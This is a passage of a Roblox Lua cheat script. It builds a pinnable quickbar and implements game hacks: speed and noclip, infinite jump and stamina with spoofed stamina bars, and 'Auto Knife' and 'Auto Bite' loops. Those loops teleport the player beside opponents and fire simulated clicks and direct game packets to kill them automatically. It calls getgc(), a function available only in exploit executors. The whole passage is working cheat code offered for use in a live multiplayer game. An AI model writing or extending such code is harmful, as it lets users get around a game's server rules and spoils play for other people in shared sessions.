        qbFrame.BorderSizePixel = 0
        qbFrame.Size = UDim2.fromOffset(0, 46)
        qbFrame.AutomaticSize = Enum.AutomaticSize.X
        qbFrame.Position = UDim2.fromOffset(0, 0)
        local qbLayout = Instance.new("UIListLayout", qbFrame)
        qbLayout.FillDirection = Enum.FillDirection.Horizontal
        qbLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        qbLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
        qbLayout.Padding = UDim.new(0, 4)
        local qbPad = Instance.new("UIPadding", qbFrame)
        qbPad.PaddingLeft  = UDim.new(0, 6)
        qbPad.PaddingRight = UDim.new(0, 6)

        -- Picker panel: shorter chips, max width capped, scrollable
        local pickerMaxW = math.min(vp.X - 20, 440)
        pickerFrame.Size = UDim2.fromOffset(pickerMaxW, 52)
        pickerScroll.Size = UDim2.new(1, -8, 0, 32)
        pickerScroll.Position = UDim2.fromOffset(4, 18)
        pickerScroll.CanvasSize = UDim2.fromOffset(#QB_ALL * 68, 0)

        local function _resizeContainer(open)
            local barW = math.min(qbFrame.AbsoluteSize.X, qbMaxW)
            if open then
                local w = math.max(barW, pickerMaxW)
                qbContainer.Size = UDim2.fromOffset(w, 98)  -- bar(46) + gap(0) + picker(52)
                qbScroll.Size = UDim2.fromOffset(w, 46)
                pickerFrame.Size = UDim2.fromOffset(w, 52)
                pickerFrame.Position = UDim2.fromOffset(0, 46)
            else
                qbContainer.Size = UDim2.fromOffset(barW, 46)
                qbScroll.Size = UDim2.fromOffset(barW, 46)
                pickerFrame.Position = UDim2.fromOffset(0, 46)
            end
        end

        -- Keep scroll canvas and container in sync with button count
        qbLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            local contentW = qbLayout.AbsoluteContentSize.X + 12
            qbScroll.CanvasSize = UDim2.fromOffset(contentW, 0)
            if not _pickerOpen then
                local barW = math.min(contentW, qbMaxW)
                qbContainer.Size = UDim2.fromOffset(barW, 46)
                qbScroll.Size = UDim2.fromOffset(barW, 46)
            end
        end)

        -- "+" button (always rightmost)
        local addBtn = Instance.new("TextButton", qbFrame)
        addBtn.Size = UDim2.fromOffset(32, 32)
        addBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 30)
        addBtn.BorderSizePixel = 0
        addBtn.Text = "+"
        addBtn.TextColor3 = Color3.fromRGB(0, 240, 110)
        addBtn.Font = Enum.Font.GothamBold
        addBtn.TextSize = 18
        addBtn.LayoutOrder = 999
        Instance.new("UICorner", addBtn).CornerRadius = UDim.new(0, 8)

        local _pickerOpen = false
        addBtn.MouseButton1Click:Connect(function()
            _pickerOpen = not _pickerOpen
            pickerFrame.Visible = _pickerOpen
            _resizeContainer(_pickerOpen)
            addBtn.Text = _pickerOpen and "-" or "+"
        end)

        local _qbBtns = {}

        local function _rebuildQb()
            for _, b in ipairs(_qbBtns) do pcall(function() b:Destroy() end) end
            _qbBtns = {}
            for _, def in ipairs(QB_ALL) do
                local label, cfgKey = def[1], def[2]
                if not _qbPinned[cfgKey] then continue end
                local btn = Instance.new("TextButton", qbFrame)
                btn.Size = UDim2.fromOffset(66, 32)
                btn.BorderSizePixel = 0
                btn.Font = Enum.Font.GothamBold
                btn.TextSize = 10
                btn.LayoutOrder = 1
                Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
                addBtn.LayoutOrder = 999
                local getState = def[4]  -- optional custom getState fn
                local doToggle = def[5]  -- optional custom toggle fn
                local isQuest  = (cfgKey == "_quest")
                local function refresh()
                    local on = getState and getState() or cfg[cfgKey]
                    -- Quest button: always shows as active indicator (one-shot)
                    if isQuest then
                        btn.BackgroundColor3 = Color3.fromRGB(0, 80, 160)
                        btn.TextColor3 = Color3.fromRGB(100, 180, 255)
                        btn.Text = "▶ Quest"
                        return
                    end
                    btn.BackgroundColor3 = on and Color3.fromRGB(5,60,30) or Color3.fromRGB(18,28,22)
                    btn.TextColor3 = on and Color3.fromRGB(0,240,110) or Color3.fromRGB(120,130,120)
                    btn.Text = (on and "* " or ". ") .. label
                end
                refresh()
                btn.MouseButton1Click:Connect(function()
                    if doToggle then
                        pcall(doToggle)
                    else
                        cfg[cfgKey] = not cfg[cfgKey]
                        if syncFns  and syncFns[cfgKey]    then pcall(syncFns[cfgKey],    cfg[cfgKey]) end
                        if featureFns and featureFns[cfgKey] then pcall(featureFns[cfgKey], cfg[cfgKey]) end
                    end
                    refresh()
                end)
                _qbBtns[#_qbBtns+1] = btn
                _qbBtns[cfgKey] = refresh
            end
            -- auto-size bar to fit current pinned count
            local pinCount = 0
            for _, def in ipairs(QB_ALL) do if _qbPinned[def[2]] then pinCount += 1 end end
            _resizeContainer(_pickerOpen)
        end

        -- Build picker chips (scrollable, tap to pin/unpin)
        for _, def in ipairs(QB_ALL) do
            local label, cfgKey = def[1], def[2]
            local pb = Instance.new("TextButton", pickerScroll)
            pb.Size = UDim2.fromOffset(64, 26)
            pb.BorderSizePixel = 0
            pb.Font = Enum.Font.GothamBold
            pb.TextSize = 9
            Instance.new("UICorner", pb).CornerRadius = UDim.new(0, 6)
            local function rp()
                local p = _qbPinned[cfgKey]
                pb.BackgroundColor3 = p and Color3.fromRGB(0,100,40) or Color3.fromRGB(18,28,22)
                pb.TextColor3 = p and Color3.fromRGB(0,240,110) or Color3.fromRGB(140,150,140)
                pb.Text = (p and "[+] " or "[ ] ") .. label
            end
            rp()
            pb.MouseButton1Click:Connect(function()
                _qbPinned[cfgKey] = not _qbPinned[cfgKey]
                _saveQbPins()
                rp()
                _rebuildQb()
            end)
        end

        _rebuildQb()

        -- Keep quickbar in sync with main UI toggles every frame
        RunService.Heartbeat:Connect(function()
            for k, fn in pairs(_qbBtns) do
                if type(fn) == "function" then pcall(fn) end
            end
        end)
    end
    -- ════════════════════════════════════════════════════════════
    -- FEATURE BACKENDS
    -- ════════════════════════════════════════════════════════════

    -- ── Shared helpers ────────────────────────────────────────────────────
    local VirtualUser = game:GetService("VirtualUser")
    local function getCharacter() return LocalPlayer.Character end
    local function getHRP()
        local ch = getCharacter()
        return ch and ch:FindFirstChild("HumanoidRootPart")
    end
    local function getHumanoid()
        local ch = getCharacter()
        return ch and ch:FindFirstChildOfClass("Humanoid")
    end

    -- ════════════════════════════════════════════════════════════
    -- PLAYER TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════
    
    -- ── Speed (TranslateBy MoveDirection) ────────────────────────────────
    RunService.Heartbeat:Connect(function(dt)
        pcall(function()
            if not cfg.SpeedEnabled then return end
            local ch  = LocalPlayer.Character
            local hum = ch and ch:FindFirstChildWhichIsA("Humanoid")
            if not ch or not hum or not hum.Parent then return end
            if hum.MoveDirection.Magnitude > 0 then
                ch:TranslateBy(hum.MoveDirection * cfg.Speed * dt)
            end
        end)
    end)

    -- ── Noclip ────────────────────────────────────────────────────────────
    local function _aNS()
        local ch = getCharacter()
        if not ch then return end
        for _, p in ipairs(ch:GetDescendants()) do
            if p:IsA("BasePart") then
                local isAccessoryPart = p.Parent and p.Parent:IsA("Accessory")
                if not isAccessoryPart then
                    p.CanCollide = not cfg.NoclipEnabled
                end
            end
        end
    end
    RunService.Stepped:Connect(function()
        if cfg.NoclipEnabled then _aNS() end
    end)
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.1)
        if cfg.NoclipEnabled then _aNS() end
    end)

    -- ── Infinite Jump ─────────────────────────────────────────────────────
    UserInputService.JumpRequest:Connect(function()
        if not cfg.InfiniteJumpEnabled then return end
        local hum = getHumanoid()
        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
    end)

    -- ── No Jump Cooldown ──────────────────────────────────────────────────
    do
        local njHolding  = false
        local njCooldown = false
        UserInputService.InputBegan:Connect(function(inp, gp)
            if gp then return end
            if inp.KeyCode == Enum.KeyCode.Space then njHolding = true end
        end)
        UserInputService.InputEnded:Connect(function(inp)
            if inp.KeyCode == Enum.KeyCode.Space then njHolding = false end
        end)
        -- reset cooldown lock on respawn so the loop never gets stuck
        LocalPlayer.CharacterAdded:Connect(function()
            njCooldown = false
        end)
        task.spawn(function()
            while true do
                task.wait()
                if not (cfg.NoJumpCD and njHolding and not njCooldown) then continue end
                local hum = getHumanoid()
                if not hum then continue end
                if hum:GetState() ~= Enum.HumanoidStateType.Running then continue end
                njCooldown = true
                hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
                -- wait for Landed with a timeout so respawn can't permanently lock njCooldown
                local t = 0
                repeat local dt = task.wait(); t = t + dt until hum:GetState() == Enum.HumanoidStateType.Landed or t > 3
                task.wait(0.1)
                njCooldown = false
            end
        end)
    end

    -- ── Infinite Stamina ──────────────────────────────────────────────────
    do
        local staminaConn, staminaWSConn = nil, nil
        local staminaShiftBeganConn, staminaShiftEndedConn = nil, nil
        local staminaSprinting = false

        local function _xSS()
            staminaSprinting = false
            if staminaWSConn then staminaWSConn:Disconnect(); staminaWSConn = nil end

            if _AUTO._staminaMoveConn then
                pcall(function() _AUTO._staminaMoveConn:Disconnect() end)
                _AUTO._staminaMoveConn = nil
            end

            if staminaTrack then
                pcall(function() staminaTrack:Stop(0.1) end)
                staminaTrack = nil
            end
            local ch  = LocalPlayer.Character
            local hum = ch and ch:FindFirstChildOfClass("Humanoid")
            if hum then pcall(function() hum.WalkSpeed = 15 end) end
        end

        local function _sSS()
            if staminaSprinting then return end
            if not cfg.InfiniteStamina then return end
            local ch = LocalPlayer.Character
            if not ch then return end
            local hum = ch:FindFirstChildOfClass("Humanoid")
            if not hum then return end
            staminaSprinting = true

            local speed = cfg.SprintSpeed or 22
            pcall(function() hum.WalkSpeed = speed end)
            staminaWSConn = hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                if staminaSprinting and cfg.InfiniteStamina and math.abs(hum.WalkSpeed - speed) > 1 then
                    task.defer(function()
                        local s = cfg.SprintSpeed or 22
                        pcall(function() hum.WalkSpeed = s end)
                    end)
                end
            end)

            local animId = ""
            local sprintVal = ch:FindFirstChild("SprintAnim")
            if sprintVal and sprintVal:IsA("StringValue") and sprintVal.Value ~= "" then
                animId = sprintVal.Value
            end
            if animId == "" then
                local animScript = ch:FindFirstChild("Animate")
                if animScript then
                    local runNode = animScript:FindFirstChild("run")
                    if runNode then
                        local animRef = runNode:FindFirstChildOfClass("Animation")
                        if animRef and animRef.AnimationId ~= "" then animId = animRef.AnimationId end
                    end
                    local sprintNode = animScript:FindFirstChild("sprint")
                    if sprintNode then
                        local animRef = sprintNode:FindFirstChildOfClass("Animation")
                        if animRef and animRef.AnimationId ~= "" then animId = animRef.AnimationId end
                    end
                end
            end

            -- only load if we have a valid non-empty asset id
            if animId ~= "" and animId:match("rbxassetid://") then
                local animr = hum:FindFirstChildWhichIsA("Animator")
                if not animr then
                    animr = Instance.new("Animator")
                    animr.Parent = hum
                end
                local anim = Instance.new("Animation")
                anim.AnimationId = animId
                local ok, track = pcall(function() return animr:LoadAnimation(anim) end)
                if ok and track then
                    staminaTrack = track
                    track.Priority = Enum.AnimationPriority.Action
                    track.Looped   = true
                    local ratio = math.clamp((cfg.SprintSpeed or 22) / 20, 0.5, 3)
                    pcall(function() track:AdjustSpeed(ratio) end)

                    local wasMoving = false
                    local moveConn
                    moveConn = RunService.Heartbeat:Connect(function()
                        if not staminaSprinting or not cfg.InfiniteStamina then
                            if wasMoving then
                                wasMoving = false
                                pcall(function() track:Stop(0.15) end)
                            end
                            if moveConn then moveConn:Disconnect(); moveConn = nil end
                            return
                        end
                        local moving = hum.MoveDirection.Magnitude > 0.1
                        if moving and not wasMoving then
                            wasMoving = true
                            pcall(function() track:Play() end)
                        elseif not moving and wasMoving then
                            wasMoving = false
                            pcall(function() track:Stop(0.1) end)
                        end
                    end)

                    _AUTO._staminaMoveConn = moveConn
                end
            end
        end

        local _staminaUIPatchConn  = nil
        local _staminaBarRef       = nil
        local _staminaLblRef       = nil
        local _staminaPropConns    = {}

        local function _clearStaminaCache()
            for _, c in ipairs(_staminaPropConns) do pcall(function() c:Disconnect() end) end
            _staminaPropConns = {}

            if _staminaLblRef and _staminaLblRef.Parent then
                local orig = _staminaLblRef:GetAttribute("_origStaminaText")
                if orig then _staminaLblRef.Text = orig; _staminaLblRef:SetAttribute("_origStaminaText", nil) end
            end
            if _staminaBarRef and _staminaBarRef.Parent then
                local orig = _staminaBarRef:GetAttribute("_origStaminaWidth")
                if orig then
                    _staminaBarRef.Size = UDim2.new(orig, 0, _staminaBarRef.Size.Y.Scale, _staminaBarRef.Size.Y.Offset)
                    _staminaBarRef:SetAttribute("_origStaminaWidth", nil)
                end
            end
            _staminaBarRef = nil
            _staminaLblRef = nil

            if _AUTO._staminaUnlockFn then pcall(_AUTO._staminaUnlockFn) end
        end

        local function _findStaminaElements()
            local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
            if not pg then return false end
            for _, desc in ipairs(pg:GetDescendants()) do
                if not _staminaLblRef and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
                    local t = desc.Text or ""
                    if t:match("^%d+/%d+$") then
                        local cur, mx = t:match("^(%d+)/(%d+)$")
                        if cur and mx and tonumber(mx) == 100 then
                            _staminaLblRef = desc
                        end
                    end
                end
                if not _staminaBarRef and desc:IsA("Frame") then
                    local parentFrame = desc.Parent
                    if parentFrame and parentFrame:IsA("Frame") then
                        local sw = desc.Size.X.Scale
                        if sw > 0 and sw < 0.999 and desc.Size.Y.Scale > 0.5 then
                            _staminaBarRef = desc
                        end
                    end
                end
                if _staminaLblRef and _staminaBarRef then break end
            end
            return _staminaLblRef ~= nil or _staminaBarRef ~= nil
        end

        local _creditsStaminaClip        = nil
        local _creditsClipOrigSize       = nil
        local _creditsStaminaBar         = nil
        local _creditsStaminaBarOrigSize  = nil

        local function _lockCreditsStaminaBar()
            if not _creditsStaminaClip or not _creditsStaminaClip.Parent then
                _creditsStaminaClip = nil; _creditsClipOrigSize = nil
                _creditsStaminaBar = nil; _creditsStaminaBarOrigSize = nil
                local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
                if not pg then return end
                local ok, clip = pcall(function() return pg.CreditsUI.Collage.StaminaBar.Clip end)
                if ok and clip and clip:IsA("Frame") then
                    _creditsStaminaClip = clip
                    _creditsClipOrigSize = UDim2.new(1, 0, 1, 0)
                    local bar = clip.Parent
                    if bar and bar:IsA("Frame") then
                        _creditsStaminaBar = bar
                        _creditsStaminaBarOrigSize = bar.Size
                    end
                end
            end

            if _creditsStaminaClip and _creditsStaminaClip.Parent then
                pcall(function() _creditsStaminaClip.Size = UDim2.new(1, 0, 1, 0) end)
            end
            if _creditsStaminaBar and _creditsStaminaBar.Parent and _creditsStaminaBarOrigSize then
                pcall(function() _creditsStaminaBar.Size = _creditsStaminaBarOrigSize end)
            end
        end

        local function _unlockCreditsStaminaBar()
            if _creditsStaminaClip and _creditsStaminaClip.Parent and _creditsClipOrigSize then
                pcall(function()
                    _creditsStaminaClip.Size = _creditsClipOrigSize
                end)
            end
            _creditsStaminaClip = nil
            _creditsClipOrigSize = nil
        end
        _AUTO._staminaUnlockFn = _unlockCreditsStaminaBar

        local function _applyStaminaOverride()
            if _staminaLblRef and _staminaLblRef.Parent then
                if not _staminaLblRef:GetAttribute("_origStaminaText") then
                    _staminaLblRef:SetAttribute("_origStaminaText", _staminaLblRef.Text)
                end
                _staminaLblRef.Text = "INF/100"
            end
            if _staminaBarRef and _staminaBarRef.Parent then
                pcall(function() _staminaBarRef.AnchorPoint = Vector2.new(0, 0) end)
                pcall(function() _staminaBarRef.Position = UDim2.new(0, 0, _staminaBarRef.Position.Y.Scale, _staminaBarRef.Position.Y.Offset) end)
                pcall(function() _staminaBarRef.Size = UDim2.new(1, 0, _staminaBarRef.Size.Y.Scale, _staminaBarRef.Size.Y.Offset) end)
            end

            _lockCreditsStaminaBar()
        end

        local function patchStaminaUI(enable)
            if _staminaUIPatchConn then _staminaUIPatchConn:Disconnect(); _staminaUIPatchConn = nil end
            _clearStaminaCache()
            if not enable then return end

            local findTick = 0
            _staminaUIPatchConn = RunService.Heartbeat:Connect(function(dt)
                if not cfg.InfiniteStamina then return end

                if _staminaLblRef and _staminaLblRef.Parent and
                   _staminaBarRef and _staminaBarRef.Parent then
                    _applyStaminaOverride()
                    return
                end

                if (_staminaLblRef and not _staminaLblRef.Parent) or
                   (_staminaBarRef and not _staminaBarRef.Parent) then
                    _clearStaminaCache()
                end

                findTick = findTick + dt
                if findTick < 0.5 then return end
                findTick = 0
                if _findStaminaElements() then
                    _applyStaminaOverride()
                end
            end)
        end

        _xIS = function()
            patchStaminaUI(false)
            _xSS()
            if staminaConn then staminaConn:Disconnect(); staminaConn = nil end
            if staminaShiftBeganConn then staminaShiftBeganConn:Disconnect(); staminaShiftBeganConn = nil end
            if staminaShiftEndedConn then staminaShiftEndedConn:Disconnect(); staminaShiftEndedConn = nil end
        end

        _sIS = function()
            _xIS()
            patchStaminaUI(true)

            staminaShiftBeganConn = UserInputService.InputBegan:Connect(function(input, gp)
                if gp then return end
                if input.KeyCode == Enum.KeyCode.LeftShift and cfg.InfiniteStamina then
                    _sSS()
                end
            end)
            staminaShiftEndedConn = UserInputService.InputEnded:Connect(function(input, gp)
                if input.KeyCode == Enum.KeyCode.LeftShift then
                    _xSS()
                end
            end)

            staminaConn = LocalPlayer.CharacterAdded:Connect(function(newCh)
                staminaSprinting = false
            end)
        end
    end

    -- Forward-declare isKnivesOut / isZombieMode — defined ~2000 lines later but needed by knife code below.
    local isKnivesOut
    local _getPackets  -- defined later in Guns section; forward-declared so the Bite loop can call it
    local isZombieMode

    -- ── Auto Knife ────────────────────────────────────────────────────────
    local knifeSwingConn, knifeTarget, knifeReturnCF
    local knifeQueue = {}
    KNIFE.TARGET_SURVIVORS = false

    local function findKnife()
        local ch = getCharacter()
        if ch then
            for _, v in ipairs(ch:GetChildren()) do
                if v:IsA("Tool") and v.Name:lower():find("knife") then return v end
            end
        end
        local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
        if bp then
            for _, v in ipairs(bp:GetChildren()) do
                if v:IsA("Tool") and v.Name:lower():find("knife") then return v end
            end
        end
        return nil
    end
    local function findBite()
        local ch = getCharacter()
        if ch then
            for _, v in ipairs(ch:GetChildren()) do
                if v:IsA("Tool") and v.Name:upper() == "BITE" then return v end
            end
        end
        local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
        if bp then
            for _, v in ipairs(bp:GetChildren()) do
                if v:IsA("Tool") and v.Name:upper() == "BITE" then return v end
            end
        end
        return nil
    end
    local function isSpectator(p)
        if not p or not p.Team then return false end
        return p.Team.Name:lower():find("spectator") ~= nil
    end
    local function playerHasGun(p)
        local ch = p and p.Character
        if not ch then return false end
        for _, v in ipairs(ch:GetChildren()) do
            if v:IsA("Tool") and v:GetAttribute("Gun") then return true end
        end
        return false
    end

    local function knifeIsTargetDead(plr)
        if not plr or not plr.Parent then return true end
        local ch  = plr.Character
        local hum = ch and ch:FindFirstChildOfClass("Humanoid")
        return not hum or hum.Health <= 0
    end
    local function isPlayerOnKillerTeam_knife(p)
        if not p or not p.Team then return false end
        local t = p.Team.Name:lower()
        return t == "killers" or t == "killer"
    end
    -- Cached mode flags — rechecked every 10 s to avoid running getgc() on every Heartbeat.
    local _koModeCache, _koModeTime = false, 0
    local function _isKOCached()
        local now = tick()
        if now - _koModeTime > 10 then
            _koModeCache = isKnivesOut()
            _koModeTime  = now
        end
        return _koModeCache
    end
    local _zmModeCache, _zmModeTime = false, 0
    local function _isZMCached()
        local now = tick()
        if now - _zmModeTime > 10 then
            _zmModeCache = isZombieMode()
            _zmModeTime  = now
        end
        return _zmModeCache
    end

    -- Build the knife target queue.
    -- Normal mode  : targets the Killer team (or Survivors if TARGET_SURVIVORS=true)
    -- Knives Out   : no dedicated Killer team — targets everyone not on our team
    --               (or all non-local players if teams haven't been assigned yet)
    local function _kRQ()
        knifeQueue = {}
        local koMode = _isKOCached()
        for _, p in ipairs(Players:GetPlayers()) do
            if p == LocalPlayer then continue end
            if knifeIsTargetDead(p) then continue end
            local shouldTarget
            if koMode then
                -- Knives Out: target anyone not on our team (FFA-style)
                local myTeam = LocalPlayer.Team
                local pTeam  = p.Team
                if myTeam and pTeam then
                    shouldTarget = (myTeam ~= pTeam)
                else
                    -- No teams assigned yet — target everyone
                    shouldTarget = true
                end
            else
                -- Normal mode: killers vs survivors
                local isKiller = isPlayerOnKillerTeam_knife(p)
                local isSurv   = not isKiller
                shouldTarget = KNIFE.TARGET_SURVIVORS and isSurv or (not KNIFE.TARGET_SURVIVORS and isKiller)
            end
            if shouldTarget and not isSpectator(p) then
                table.insert(knifeQueue, p)
            end
        end
    end
    local function knifeSetVisible(v)
        local ch = getCharacter()
        if not ch then return end
        for _, d in ipairs(ch:GetDescendants()) do
            if d:IsA("BasePart") or d:IsA("Decal") or d:IsA("SpecialMesh") then
                pcall(function()
                    if d.Parent and d.Parent:IsA("Tool") and d.Parent.Name:lower():find("knife") then
                        d.Transparency = v and 0 or 1
                    end
                end)
            end
        end
    end
    local function knifeEquip(knife)
        local hum = getHumanoid()
        if hum and knife then
            pcall(function()
                if knife.Parent ~= getCharacter() then hum:EquipTool(knife) end
            end)
        end
    end
    local _xKA, _sKA
    _xKA = function()
        if knifeSwingConn then knifeSwingConn:Disconnect(); knifeSwingConn = nil end
        knifeSetVisible(true)
        knifeTarget = nil
        knifeQueue  = {}
    end
    _sKA = function()
        _xKA()
        local knife = findKnife()
        if not knife then return end
        local startHRP = getHRP()
        if startHRP then knifeReturnCF = startHRP.CFrame end
        knifeEquip(knife)
        knifeSetVisible(false)
        _kRQ()
        knifeTarget = #knifeQueue > 0 and knifeQueue[1] or nil
        local swingTimer = 0
        knifeSwingConn = RunService.Heartbeat:Connect(function(dt)
            if not cfg.KnifeEnabled then _xKA(); return end
            if knifeIsTargetDead(knifeTarget) then
                while #knifeQueue > 0 and knifeIsTargetDead(knifeQueue[1]) do
                    table.remove(knifeQueue, 1)
                end
                _kRQ()
                knifeTarget = #knifeQueue > 0 and knifeQueue[1] or nil
                -- Keep heartbeat alive even with no targets — they may spawn in shortly
                if not knifeTarget then return end
            end
            if not knifeTarget or not knifeTarget.Character then return end
            local tHRP  = knifeTarget.Character:FindFirstChild("HumanoidRootPart")
            local myHRP = getHRP()
            if not tHRP or not myHRP then return end
            local killerHum   = knifeTarget.Character:FindFirstChildOfClass("Humanoid")
            local killerHP    = killerHum and killerHum.Health or 100
            local killerMaxHP = killerHum and (killerHum.MaxHealth > 0 and killerHum.MaxHealth or 100) or 100
            local killerHPpct = killerHP / killerMaxHP * 100
            local myHum = getHumanoid()
            if myHum and myHum.Health <= 25 then
                cfg.KnifeEnabled = false; _xKA()
                if knifeReturnCF then pcall(function() myHRP.CFrame = knifeReturnCF end) end
                return
            end
            if killerHPpct > KNIFE.ENGAGE_HP then return end
            -- findKnife() searches character first, then backpack — covers all knife skins.
            local currentKnife = findKnife()
            if not currentKnife then return end
            -- If knife is not yet in character (EquipTool can be async), force it with
            -- both EquipTool and a direct parent assign so teleport still runs this tick.
            if currentKnife.Parent ~= getCharacter() then
                local _eh = getHumanoid()
                if _eh then pcall(function() _eh:EquipTool(currentKnife) end) end
                pcall(function() currentKnife.Parent = getCharacter() end)
            end
            local sidePos = tHRP.Position
                + tHRP.CFrame.RightVector * KNIFE.SIDE_OFF
                + tHRP.CFrame.LookVector  * KNIFE.BACK_OFF
                + Vector3.new(0, -KNIFE.VERT_OFF, 0)
            pcall(function() myHRP.CFrame = CFrame.new(sidePos, tHRP.Position) end)
            swingTimer = swingTimer + dt
            if swingTimer < KNIFE.RATE then return end
            swingTimer = 0
            -- Spawn so task.wait can be used — lets the follow-camera settle on the
            -- target before we sample WorldToViewportPoint, matching doPipeHit logic.
            task.spawn(function()
                local cam = workspace.CurrentCamera
                local prevCamType = cam.CameraType
                cam.CameraType = Enum.CameraType.Scriptable
                task.wait(0.05)
                local sp, onScreen = cam:WorldToViewportPoint(tHRP.Position)
                local clickPos = (onScreen and sp.Z > 0)
                    and Vector2.new(sp.X, sp.Y)
                    or  Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
                pcall(function() VirtualUser:Button1Down(clickPos, cam.CFrame) end)
                task.wait(0.1)
                pcall(function() VirtualUser:Button1Up(clickPos, cam.CFrame) end)
                cam.CameraType = prevCamType
            end)
        end)
    end
    LocalPlayer.CharacterAdded:Connect(function()
        _xKA()
        if cfg.KnifeEnabled then task.wait(0.5); _sKA() end
    end)

    -- ── KO Mode auto-start watcher ────────────────────────────────────────
    -- Watches for a knife being handed to the player mid-round.
    -- If Knives Out is active, auto-enables Auto Knife Attack so the user
    -- doesn't have to manually toggle it every round.
    do
        local _koWatchConn = nil
        local function _hookKOKnifeWatch(ch)
            if _koWatchConn then _koWatchConn:Disconnect(); _koWatchConn = nil end
            if not ch then return end
            _koWatchConn = ch.ChildAdded:Connect(function(child)
                if not child:IsA("Tool") then return end
                if not child.Name:lower():find("knife") then return end
                -- Only restart the swing loop if the user already has Auto Knife ON.
                -- Never force-enable it — that overrides user intent.
                if cfg.KnifeEnabled and not knifeSwingConn then
                    task.wait(0.3)
                    _sKA()
                end
            end)
        end
        -- Hook current character and every future respawn.
        -- Delay reduced to 0.1 s so watcher is ready before the game hands a knife.
        _hookKOKnifeWatch(getCharacter())
        LocalPlayer.CharacterAdded:Connect(function(ch)
            task.wait(0.1)
            _hookKOKnifeWatch(ch)
        end)
    end

    -- ── Knife fallback poll ───────────────────────────────────────────────
    -- If KnifeEnabled is on, swing loop isn't running, and we already have a
    -- knife, restart it.  Runs every 1 s and catches every timing edge case:
    --   • knife arrived before the ChildAdded watcher was hooked
    --   • _sKA() returned early because findKnife() was nil at call time
    --   • any other reason the loop silently died
    do
        local _knifeCheckTimer = 0
        RunService.Heartbeat:Connect(function(dt)
            if not cfg.KnifeEnabled then return end
            if knifeSwingConn then _knifeCheckTimer = 0; return end
            _knifeCheckTimer = _knifeCheckTimer + dt
            if _knifeCheckTimer < 1 then return end
            _knifeCheckTimer = 0
            if findKnife() then _sKA() end
        end)
    end

    -- ── Auto Bite (Zombie mode) ───────────────────────────────────────────
    -- When the player has a BITE tool, teleport to the nearest armed survivor
    -- and trigger the tool via VirtualUser (same as knife) so the game's own
    -- Activated handler fires Packets.useItem:Fire("Bite",{}).
    -- Direct packet is also sent as a backup. 1500 ms cooldown.
    local biteSwingConn, biteTarget
    local _lastBiteMs = 0
    local _xBiteA, _sBiteA
    _xBiteA = function()
        if biteSwingConn then biteSwingConn:Disconnect(); biteSwingConn = nil end
        biteTarget = nil
    end
    _sBiteA = function()
        _xBiteA()
        local biteSwingTimer = 0
        biteSwingConn = RunService.Heartbeat:Connect(function(dt)
            if not cfg.BiteEnabled then _xBiteA(); return end
            local bite = findBite()
            if not bite then return end
            -- Force-equip BITE into character synchronously so the server sees it held
            local ch  = getCharacter()
            local hum = getHumanoid()
            if bite.Parent ~= ch then
                if hum then pcall(function() hum:EquipTool(bite) end) end
                pcall(function() bite.Parent = ch end)
                return  -- skip this frame, let equip settle
            end
            -- Pick nearest armed survivor
            if not biteTarget or knifeIsTargetDead(biteTarget)
            or not playerHasGun(biteTarget) or isSpectator(biteTarget) then
                biteTarget = nil
                local myHRP  = getHRP()
                local bestDist = math.huge
                for _, p in ipairs(Players:GetPlayers()) do
                    if p == LocalPlayer then continue end
                    if knifeIsTargetDead(p)  then continue end
                    if isSpectator(p)        then continue end
                    if not playerHasGun(p)   then continue end
                    local pch  = p.Character
                    local pHRP = pch and pch:FindFirstChild("HumanoidRootPart")
                    if pHRP and myHRP then
                        local d = (pHRP.Position - myHRP.Position).Magnitude
                        if d < bestDist then bestDist = d; biteTarget = p end
                    end
                end
            end
            if not biteTarget or not biteTarget.Character then return end
            local tHRP  = biteTarget.Character:FindFirstChild("HumanoidRootPart")
            local myHRP = getHRP()
            if not tHRP or not myHRP then return end
            -- Teleport beside target (reuses knife offsets)
            local sidePos = tHRP.Position
                + tHRP.CFrame.RightVector * KNIFE.SIDE_OFF
                + tHRP.CFrame.LookVector  * KNIFE.BACK_OFF
                + Vector3.new(0, -KNIFE.VERT_OFF, 0)
            pcall(function() myHRP.CFrame = CFrame.new(sidePos, tHRP.Position) end)
            -- 1500 ms cooldown (matches real BITE script)
            biteSwingTimer = biteSwingTimer + dt
            if biteSwingTimer < 1.5 then return end
            biteSwingTimer = 0
            local nowMs = DateTime.now().UnixTimestampMillis
            if nowMs - _lastBiteMs < 1500 then return end
            _lastBiteMs = nowMs
            -- Fire via VirtualUser click (triggers tool's Activated → fires packet)
            -- AND direct packet as backup — same dual approach as knife
            task.spawn(function()
                local cam = workspace.CurrentCamera
                local prevCamType = cam.CameraType
                cam.CameraType = Enum.CameraType.Scriptable
                task.wait(0.05)
                local sp, onScreen = cam:WorldToViewportPoint(tHRP.Position)
                local clickPos = (onScreen and sp.Z > 0)
                    and Vector2.new(sp.X, sp.Y)
                    or  Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
                pcall(function() VirtualUser:Button1Down(clickPos, cam.CFrame) end)
                task.wait(0.08)
                pcall(function() VirtualUser:Button1Up(clickPos, cam.CFrame) end)
                cam.CameraType = prevCamType
                -- Backup: direct packet in case Activated didn't propagate
                task.wait(0.05)
                local pkts = _getPackets()
                if pkts and pkts.useItem then
                    pcall(function() pkts.useItem:Fire("Bite", {}) end)
                end
            end)
        end)
    end

    -- ── Auto Bite watcher — starts loop whenever BITE is given and toggle is on ──
    do
        local _zmWatchConn = nil
        local function _hookZMBiteWatch(ch)
            if _zmWatchConn then _zmWatchConn:Disconnect(); _zmWatchConn = nil end
            if not ch then return end
            _zmWatchConn = ch.ChildAdded:Connect(function(child)
